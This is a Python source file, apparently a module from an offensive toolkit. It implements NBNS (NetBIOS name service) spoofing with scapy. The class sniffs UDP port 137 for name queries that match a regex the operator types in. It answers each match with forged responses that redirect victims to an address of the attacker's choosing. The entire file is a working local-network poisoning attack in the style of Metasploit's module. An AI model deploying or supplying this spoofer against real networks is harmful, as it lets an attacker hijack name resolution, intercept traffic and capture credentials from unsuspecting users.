import util
import re 
from threading import Thread
from scapy.all import *

#
# implements NBNS spoofing as seen in msf.
# Requests are matched based on Python's regex parser.  Careful!
# http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html
#

class NBNSSpoof:
	def __init__(self):
		conf.verb = 0
		self.local_mac = get_if_hwaddr(conf.iface)
		self.regex_match = None
		self.redirect = None
		self.running = False

	#
	# callback for packets; match 
	#
	def handler(self,pkt):
		if pkt.haslayer(NBNSQueryRequest):
			request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
			ret = self.regex_match.search(request)
			if not ret.group(0) is None: 
				trans_id = pkt[NBNSQueryRequest].getfieldval('NAME_TRN_ID')
				response = Ether(dst=pkt[Ether].src, src=self.local_mac)
				response /= IP(dst=pkt[IP].src)/UDP(sport=137,dport=137)
				response /= NBNSQueryResponse(NAME_TRN_ID=trans_id, RR_NAME=request, NB_ADDRESS=self.redirect)
				del response[UDP].chksum # recalc checksum
				sendp(response)	# layer 2 send for performance

	def initialize(self):
		while True:
			try:
				tmp = raw_input('[+] Match request regex: ')
				self.regex_match = re.compile(tmp)
				self.redirect = raw_input('[+] Redirect matched requests to: ')
				tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct? '%(self.regex_match.pattern, self.redirect))
				if 'n' in tmp.lower():
					return
				break
			except:
				pass

		print '[!] Starting NBNS spoofer...' 
		sniffr = Thread(target=self.sniff_thread)
		sniffr.start()
		self.running = True
		return True

	#
	# sniff thread; idk how i squeeze this performance out of all this
	#
	def sniff_thread(self):
		sniff(filter='udp and port 137', prn=self.handler, store=0, stopper=self.stop_call,
												stopperTimeout=3)

			
	#
	# check status of spoofer
	#
	def stop_call(self):
		if self.running:
			return False
		util.debug('nbns spoofer shutdown')
		return True

	#
	# callback shutdown
	#
	def shutdown(self):
		util.Msg("Shutting down NBNS spoofer...")
		if self.running:
			self.running = False
		return True